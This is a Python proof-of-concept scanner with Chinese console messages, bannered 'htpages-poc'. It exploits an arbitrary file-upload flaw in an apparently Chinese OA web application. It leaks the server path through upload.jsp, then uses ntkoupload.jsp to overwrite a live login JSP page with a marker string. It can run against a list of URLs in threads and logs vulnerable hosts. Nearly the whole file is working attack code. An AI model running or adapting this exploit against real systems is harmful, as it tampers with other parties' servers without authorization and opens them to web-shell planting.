import requests
import re
import time
from threading import Thread
import warnings
import random
from multiprocessing import Pool
def main():
    warnings.filterwarnings('ignore')  # 忽略SSL警告
    print ("单url检测请按1，多url检测请按其他任意值:")
    choose=input()
    if choose=='1':
        print ("input:")
        url=input()
        bp(url)
    else:
        # 读取txt文件
        with open("./url.txt", "r") as f:
            # pool = Pool(60)
            for url in f.readlines():
                url = url.strip('\n')
                # print(url)
            #     pool.apply_async(bp,(url,))
            # pool.close()
            # pool.join()
                t = Thread(target=bp, args=(url,))
                t.start()
def bp(url):
    try:
        if 'http' not in url:
            url='http://'+url
        path=get_path(url)
        if path==0:
            print('[-]   '+url+'没找到上传路径,尝试直接拼接路径中。。。')
            path='D:/htoa/'
        else:
            print('[*]   '+url+'已找到上传路径：'+path)
        flag=wirtefile(url,path)
        if flag==1:
            print('[+]   '+url+'存在漏洞')
            f = open("./success.txt", 'a')
            f.write(url+'\n')
            f.close()
        # if r2.status_code==200:
        #     print('[666]   '+url2+'存在配置文件')
        #     fff = open("./configsuccess.txt", 'a')
        #     fff.write(url2 + '\n')
        #     fff.close()
        else:
            print('[-]   '+url+'不存在漏洞')
    except:
        print('[!]   '+url+'连接失败')
def get_path(url):
    if url[-1]=='/':
        urls = url + "OAapp/jsp/upload.jsp"
    else:
        urls = url + "/OAapp/jsp/upload.jsp"
    headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Referer': 'http://116.63.142.107:8081/OAapp/jsp/upload.jsp',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundary5Ur8laykKAWws2QO',
    'Content-Length': '285',
    }
    body='''
------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition: form-data;name="file"; filename="xxx.xml"\r\nContent-Type: image/png\r\n\r\nreal path\r\n------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition: form-data;name="filename"\r\n\r\nxxx.png\r\n------WebKitFormBoundary5Ur8laykKAWws2QO--\r\n'''
    r=requests.post(urls,body,headers=headers,verify=False,timeout=5)
    # print(r.text)
    try:
        path=re.findall('(.*?)Tomcat/webapps/.*?\.dat',r.text)[0]
    except:
        try:
            path=re.findall('(.*?)htoadata/appdata/.*?\.dat',r.text)[0]
        except:
            path=0
    return path
def wirtefile(urls,path):
    # try:
        # filename=''
        # zf='1234567890qwertyuiopasdfghjklzxcvbnm'
        # for _ in range(8):
        #     suiji1=random.randint(0,len(zf)-1)
        #     filename+=zf[suiji1]
        if urls[-1]=='/':
            url = urls + "OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp"
        else:
            url = urls + "/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Referer': 'http://116.63.142.107:8081/OAapp/jsp/upload.jsp',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm',
            'Content-Length': '363',
    }
        body=f'''------WebKitFormBoundaryzRSYXfFlXqk6btQm\r
Content-Disposition: form-data;name="EDITFILE"; filename="xxx.txt"\r
Content-Type: image/png\r
\r
123test321\r
------WebKitFormBoundaryzRSYXfFlXqk6btQm\r
Content-Disposition: form-data; name="newFileName"\r
\r
{path}Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r
------WebKitFormBoundaryzRSYXfFlXqk6btQm'''
        requests.post(url,body,headers=headers,verify=False,timeout=5)
        # print(url)
        # print(body)
        # print(urls+'/'+filename+'.aspx')
        time.sleep(2)
        r=requests.get(urls+'/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp',verify=False,timeout=5)
        # print(r.text)
        if '123test321' in r.text :
            flag=1
            return flag 
        else :
            flag=0
            return flag
    # except:
    #     flag=0
    #     return flag
def logo():
    print('''
  _      _                                                               \r
 | |    | |                                                              \r
 | |__  | |_  _ __    __ _   __ _   ___  ___  ______  _ __    ___    ___ \r
 | '_ \ | __|| '_ \  / _` | / _` | / _ \/ __||______|| '_ \  / _ \  / __|\r
 | | | || |_ | |_) || (_| || (_| ||  __/\__ \        | |_) || (_) || (__ \r
 |_| |_| \__|| .__/  \__,_| \__, | \___||___/        | .__/  \___/  \___|\r
             | |             __/ |                   | |                 \r
             |_|            |___/                    |_|                 \r
\r
                                               by Dsb v1.0\r
        ''')
if __name__ == '__main__':
    logo()
    main()